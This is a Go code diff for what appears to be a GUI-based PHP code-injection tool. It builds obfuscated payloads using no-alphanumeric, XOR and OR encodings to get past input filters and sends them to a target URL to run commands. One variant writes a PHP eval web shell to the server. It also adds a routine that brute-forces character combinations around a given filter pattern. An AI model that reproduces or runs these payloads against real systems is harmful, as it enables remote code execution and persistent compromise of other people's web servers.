@@ -8,6 +8,7 @@ import (
 	"mime/multipart"
 	"net/http"
 	"net/url"
+	"regexp"
 	"strings"
 	"time"
 
@@ -36,7 +37,7 @@ func Qufan(c string) string {
 	return invertedString
 }
 
-func Zizeng(URL string, command string, i string, label *widget.Label) {
+func Zizeng(URL string, command string, i string, m string, label *widget.Label) {
 	var c1 string
 	var c2 string
 	leftIndex := strings.Index(command, "(")
@@ -78,25 +79,29 @@ func Zizeng(URL string, command string, i string, label *widget.Label) {
 		payload = []byte(i + "=" + "$_=(%ff/%ff.%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]();&_POST=" + c1)
 
 	}
-	// 发起 POST 请求
-	resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
-	if err != nil {
-		fmt.Println("发送 POST 请求失败:", err)
-		return
+	if m == "GET" {
+
+	} else if m == "POST" {
+		// 发起 POST 请求
+
+		resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
+		if err != nil {
+			fmt.Println("发送 POST 请求失败:", err)
+			return
+		}
+		defer resp.Body.Close()
+
+		// 读取响应
+		respBody, err := io.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Println("读取响应失败:", err)
+			return
+		}
+
+		// 输出响应
+		respBodya := RemoveHTMLTags(string(respBody))
+		label.SetText("payload为: " + string(payload) + "\n回显为: " + respBodya)
 	}
-	defer resp.Body.Close()
-
-	// 读取响应
-	respBody, err := io.ReadAll(resp.Body)
-	if err != nil {
-		fmt.Println("读取响应失败:", err)
-		return
-	}
-
-	// 输出响应
-	respBodya := RemoveHTMLTags(string(respBody))
-	label.SetText("payload为: " + string(payload) + "\n回显为: " + respBodya)
-
 }
 
 func Ff(URL string, command string, guolv string, i string, m string, label *widget.Label) {
@@ -255,16 +260,16 @@ func Ff(URL string, command string, guolv string, i string, m string, label *wid
 	}
 }
 
-func Xor(URL string, command string, v string, i string, label *widget.Label) {
+func Xor(URL string, command string, v string, canshu string, label *widget.Label) {
 	var newURL string
 	var payload string
 	if v == "5" {
-		newURL = URL + "?" + i + "=" + "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);"
+		newURL = URL + "?" + canshu + "=" + "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);"
 		fmt.Printf("payload为: %s\n", newURL)
 		fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
 		payload = "_=" + command
 	} else if v == "7" {
-		payload := "?" + i + "=$_=(%27%06%27^%27`%27).(%27%09%27^%27`%27).(%27%0c%27^%27`%27).(%27%05%27^%27`%27).%27_%27.(%27%10%27^%27`%27).(%27%15%27^%27`%27).(%27%14%27^%27`%27).%27_%27.(%27%03%27^%27`%27).(%27%0f%27^%27`%27).(%27%0e%27^%27`%27).(%27%14%27^%27`%27).(%27%05%27^%27`%27).(%27%0e%27^%27`%27).(%27%14%27^%27`%27).(%27%13%27^%27`%27);$__=(%27%01%27^%27`%27).%27.%27.(%27%10%27^%27`%27).(%27%08%27^%27`%27).(%27%10%27^%27`%27);$___=%27%3C?%27.(%27%10%27^%27`%27).(%27%08%27^%27`%27).(%27%10%27^%27`%27).%27%20%27.(%27%05%27^%27`%27).(%27%16%27^%27`%27).(%27%01%27^%27`%27).(%27%0c%27^%27`%27).%27($_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27).%27[_]);?%3E%27;$____=$_($__,$___);"
+		payload = "?" + canshu + "=$_=(%27%06%27^%27`%27).(%27%09%27^%27`%27).(%27%0c%27^%27`%27).(%27%05%27^%27`%27).%27_%27.(%27%10%27^%27`%27).(%27%15%27^%27`%27).(%27%14%27^%27`%27).%27_%27.(%27%03%27^%27`%27).(%27%0f%27^%27`%27).(%27%0e%27^%27`%27).(%27%14%27^%27`%27).(%27%05%27^%27`%27).(%27%0e%27^%27`%27).(%27%14%27^%27`%27).(%27%13%27^%27`%27);$__=(%27%01%27^%27`%27).%27.%27.(%27%10%27^%27`%27).(%27%08%27^%27`%27).(%27%10%27^%27`%27);$___=%27%3C?%27.(%27%10%27^%27`%27).(%27%08%27^%27`%27).(%27%10%27^%27`%27).%27%20%27.(%27%05%27^%27`%27).(%27%16%27^%27`%27).(%27%01%27^%27`%27).(%27%0c%27^%27`%27).%27($_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27).%27[_]);?%3E%27;$____=$_($__,$___);"
 		newURL = URL + payload
 		fmt.Printf("payload为: %s\n", newURL)
 		fmt.Printf("\033[33m" + " [Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的,结尾必须有';'\n")
@@ -275,36 +280,101 @@ func Xor(URL string, command string, v string, i string, label *widget.Label) {
 		payload = "_=" + command
 	}
 
-	client := &http.Client{}
-
-	// 创建一个 POST 请求
-	request, err := http.NewRequest("POST", newURL, strings.NewReader(payload))
-	if err != nil {
-		fmt.Println("创建请求时发生错误:", err)
-		return
-	}
-
-	// 设置 Content-Type 头部
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	// 发送请求
-	response, err := client.Do(request)
-	if err != nil {
-		fmt.Println("发送请求时发生错误:", err)
-		return
-	}
+	response, _ := http.Post(URL, "application/x-www-form-urlencoded", strings.NewReader(payload))
 	defer response.Body.Close()
+	doc, _ := io.ReadAll(response.Body)
+	bodya := RemoveHTMLTags(string(doc))
 
-	// 读取响应数据
-	body, err := io.ReadAll(response.Body)
-	if err != nil {
-		fmt.Println("读取响应时发生错误:", err)
-		return
+	label.SetText("URL为: " + newURL + "payload为: " + payload + "回显为: " + bodya)
+}
+
+func Or(URL string, command string, canshu string, label *widget.Label, guolv string, leixing string) {
+
+	var char string
+	for i := 0; i <= 0xFF; i++ {
+		//对0x00到0xff进行遍历
+		cha := byte(i) // 将整数转换为 byte 类型
+		encoded := url.QueryEscape(string(cha))
+		matches, _ := regexp.MatchString(url.QueryEscape(guolv), encoded)
+
+		if matches == false {
+			decoded, _ := url.QueryUnescape(encoded)
+			char += decoded
+		}
+
 	}
 
-	// 打印响应结果
-	bodya := RemoveHTMLTags(string(body))
-	label.SetText("payload为: " + payload + "回显为: " + bodya)
+	var c1 string
+	var c2 string
+
+	leftIndex := strings.Index(command, "(")
+	if leftIndex == -1 {
+		// 字符串中没有左括号
+		c1 = command
+		c2 = ""
+		label.SetText("字符串中没有左括号")
+	}
+
+	// 查找第一个右括号的索引
+	rightIndex := strings.Index(command, ")")
+	if rightIndex == -1 {
+		// 字符串中没有右括号
+		c1 = ""
+		c2 = ""
+		label.SetText("字符串中没有右括号")
+	}
+
+	if leftIndex < rightIndex {
+		// 括号正确匹配，提取括号内外的内容
+		//c1是括号外内容，c2是括号内内容
+		c1 = command[:leftIndex]
+		c2 = command[leftIndex+1 : rightIndex]
+
+	} else {
+		// 括号不正确匹配
+		c1 = command
+		c2 = ""
+		label.SetText("括号不正确匹配")
+	}
+
+	var c, d, e, f string
+
+	for _, a := range char {
+		for _, b := range char {
+
+			for _, dan := range c1 {
+				if string(a|b) == string(dan) {
+					a1 := url.QueryEscape(string(a))
+					b1 := url.QueryEscape(string(b))
+					c += a1
+					d += b1
+					continue
+				}
+			}
+
+			for _, dan := range c2 {
+				if string(a|b) == string(dan) {
+					a1 := url.QueryEscape(string(a))
+					b1 := url.QueryEscape(string(b))
+					e += a1
+					f += b1
+					continue
+				}
+			}
+
+			payload1 := "(\"" + c + "\"|\"" + d + "\")"
+			payload2 := "\"" + e + "\"|\"" + f + "\""
+
+			if e == "" || f == "" {
+				payload2 = ""
+			}
+
+			payload := payload1 + "(" + payload2 + ")"
+
+			result := GP(URL, canshu, leixing, payload)
+			label.SetText(result)
+		}
+	}
 }
 
 func Noshuzievaljinjie(url string, command string, v string, i string, m string, guolv string, label *widget.Label) {
@@ -428,6 +498,23 @@ func Noshuzievaljinjie(url string, command string, v string, i string, m string,
 		reS := RemoveHTMLTags(string(respBody))
 		label.SetText("payload为: " + command + "\n回显为: " + reS)
 
+	}
+
+}
+
+func Xorplus(URL string, canshu string, m string, choose string, label *widget.Label) {
+
+	var payload string
+
+	if choose == "guding" {
+
+		payload = "((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));"
+		result := GP(URL, canshu, m, payload)
+
+		label.SetText("payload为: " + payload + "\n回显为: " + result)
+
+	} else if choose == "zidingyi" {
+		//TODO：自定义少字符异或
 	}
 
 }
